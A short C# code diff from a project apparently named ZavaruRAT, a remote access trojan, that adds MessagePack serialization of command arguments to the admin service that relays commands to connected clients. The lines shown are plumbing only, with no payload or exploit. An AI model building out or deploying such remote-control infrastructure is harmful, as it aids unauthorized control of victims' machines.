@@ -1,10 +1,13 @@
 #region
 
 using System.Reactive.Linq;
+using Google.Protobuf;
 using Google.Protobuf.WellKnownTypes;
 using Grpc.Core;
+using MessagePack;
 using ZavaruRAT.Main.Runtime;
 using ZavaruRAT.Proto;
+using ZavaruRAT.Shared;
 
 #endregion
 
@@ -27,7 +30,9 @@ public sealed class AdminService : AdminHub.AdminHubBase
         {
             ClientId = request.ClientId,
             HashId = request.HashId,
-            Command = request.Command
+            Command = request.Command,
+            Args = ByteString.CopyFrom(MessagePackSerializer.Serialize(request.Arguments.ToArray(),
+                                                                       ZavaruClient.SerializerOptions))
         };
 
         _storage.ExecuteCommand(command);
